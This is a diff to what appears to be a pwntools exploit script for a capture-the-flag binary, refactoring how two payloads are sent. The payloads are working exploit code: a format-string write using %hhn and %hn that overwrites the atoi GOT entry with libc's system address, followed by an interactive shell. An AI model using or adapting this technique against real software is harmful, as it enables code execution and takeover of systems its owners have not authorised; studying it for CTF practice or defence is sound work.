@@ -41,9 +41,11 @@ bottom = libc.sym['system'] & 0xffff
 first = third - 21
 second = bottom - third
 
-a = f'1 %{first}c%43$hhn%{second}c%44$hn'
-b = b'2'.ljust(8, b' ') + p64(exe.got['atoi']+2) + p64(exe.got['atoi'])
-r.sendlineafter('A: ', a)
-r.sendlineafter('B: ', b)
+payload1 = f'1 %{first}c%43$hhn%{second}c%44$hn'
+payload2 = b'2'.ljust(8, b' ') + p64(exe.got['atoi']+2) + p64(exe.got['atoi'])
+r.recvuntil(b'A: ')
+r.sendline(payload1)
+r.recvuntil(b'B: ')
+r.sendline(payload2)
 
 r.interactive()
